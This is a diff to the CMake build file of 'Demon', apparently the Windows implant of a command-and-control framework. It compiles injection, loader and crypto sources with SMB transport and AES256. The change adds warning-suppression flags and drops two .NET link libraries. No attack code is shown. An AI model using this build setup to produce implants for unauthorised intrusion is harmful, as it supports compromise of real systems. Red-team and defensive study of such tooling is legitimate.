@@ -6,7 +6,7 @@ set( PROJECT_NAME Demon )
 # set compiler settings
 set( CMAKE_C_STANDARD 11 )
 set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
-set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )
+set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic -Wno-error=incompatible-pointer-types -Wno-error=int-conversion -Wno-error=implicit-function-declaration -Wno-error=strict-prototypes" )
 
 # adding demon sources
 include_directories( include )
@@ -79,7 +79,7 @@ add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( AES256 )
 
 # linking library
-link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )
+link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi )
 
 # add compiled demons
 add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} )
